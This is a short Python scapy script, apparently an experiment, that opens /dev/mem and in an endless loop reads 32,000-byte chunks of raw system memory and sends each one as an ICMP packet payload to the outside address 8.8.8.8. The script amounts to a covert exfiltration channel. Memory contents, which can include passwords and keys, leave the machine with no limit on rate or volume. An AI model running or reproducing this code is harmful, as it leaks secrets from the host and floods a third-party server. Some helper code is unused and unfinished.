#!/usr/bin/env python

import sys, binascii, re, os
from struct import *
from scapy.all import *

def asciirepl(match):
  # replace the hexadecimal characters with ascii characters
  s = match.group()  
  return binascii.unhexlify(s)  

def reformat_content(data):
  p = re.compile(r'\\x(\w{2})')
  return p.sub(asciirepl, data)

Ippp="8.8.8.8"
sizey=32000
lenny=0

# how do we tread /dev/mem x characters
file = open("/dev/mem")

#while(lenny<64000): # what is maximum size? 65,536 bytes
#  p=IP(dst=Ippp)/ICMP()/str(pp)
#  pp=IP(dst=Ippp)/ICMP()/str(p)
#  lenny=len(str(pp))
#  print(lenny)

  
#hexdump(pp)
while(1):
    # string of x chars from file
    string=file.read(sizey)
    pp=IP(dst=Ippp)/ICMP()/string
    print(string)
    send(pp) ## was sr1


#pkts = sniff(prn=lambda x:sys.stdout.write(str(x)))
